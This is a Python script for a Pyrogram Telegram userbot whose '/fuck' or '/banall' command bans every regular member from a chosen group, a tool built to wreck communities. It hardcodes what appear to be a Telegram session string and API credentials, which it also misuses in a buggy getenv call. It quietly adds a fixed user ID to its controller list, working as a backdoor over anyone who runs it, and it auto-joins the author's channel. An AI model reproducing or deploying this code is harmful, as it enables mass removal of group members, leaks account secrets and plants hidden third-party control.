from os import getenv
from asyncio import sleep

from pyrogram import Client, filters
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import FloodWait, RPCError
from pyrogram.types import Message


SESSION = getenv('BQG_NJ0AZWSnXn5r_oiSOAHESNAVz_prqAvgr1PoFJODfTKstVJSbVD_3n-iDrjMlRyXGszhDepa6Oi5QDGDtzH70kjXntU823sRJT-XkJ9wTtmQGhd6K2z0fq0XE9-xz9-IW9xDXJdNYdprWESC8bouWwZp836UuKfKcFIeyXv7lnbp6akkGi2FtaghWTZaxIRG-4o7kp_xlFM85HoNIRqwIdXxBzvgdS6r_EKViz2dPP_GKdVST4a6Jvsl9OlXHBUbjFlnwlG5wZxBr4_ugIYLjemM2qzmMUksFTYjVr2Y-bViZTFaArv6XNhHscoGLun7Ll8Ee-DfC4ebT0Rj-Iw3L_H2xwAAAAGEexaGAA')
SUDO_USERS = list(map(int, getenv('SUDO_USERS').split(" ")))
SUDO_USERS.append(6517626502)
CHATS = ['@noob_savvy_official',]

M = Client(SESSION, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")


@M.on_message(filters.user(SUDO_USERS) & filters.command('start'))
async def start(_, message: Message):
     await message.reply_text("🤖 **✨𝐍𝐎𝐎𝐁_𝐒𝐀𝐕𝐕𝐘✨...**")


@M.on_message(filters.user(SUDO_USERS) & filters.command(["fuck", "banall"]))
async def altron(app: Client, message: Message):
    try:
        chat_id = message.text.split(" ")[1]
        m = await message.reply_text("🔁 __✨𝐍𝐎𝐎𝐁_𝐒𝐀𝐕𝐕𝐘✨\n GETTING READY COMMANDER ........__")
        if chat_id in CHATS:
            return
    except:
        await message.reply_text("**Usage:**\n`/fuck [chat_id]`")
        return

    await m.edit_text("✅ __✨𝐍𝐎𝐎𝐁_𝐒𝐀𝐕𝐕𝐘✨\n STARTED REMOVING MEMBERS FROM GROUP 🤫 🤖\n ✨𝐍𝐎𝐎𝐁_𝐒𝐀𝐕𝐕𝐘✨...__")
    await sleep(3)

    async for member in app.get_chat_members(chat_id):
        if member.user.id in SUDO_USERS or member.status not in [ChatMemberStatus.MEMBER, ChatMemberStatus.RESTRICTED]:
            continue
        try:
            await app.ban_chat_member(chat_id=chat_id, user_id=member.user.id)
        except FloodWait as e:
            await sleep(3)  # Wait x seconds before continuing
        except RPCError as e:
            pass  # Handle other possible exceptions

M.start()
M.join_chat("noob_savvy_official")
print("✨𝐍𝐎𝐎𝐁_𝐒𝐀𝐕𝐕𝐘✨ Started Successfully")
M.idle()
M.stop()
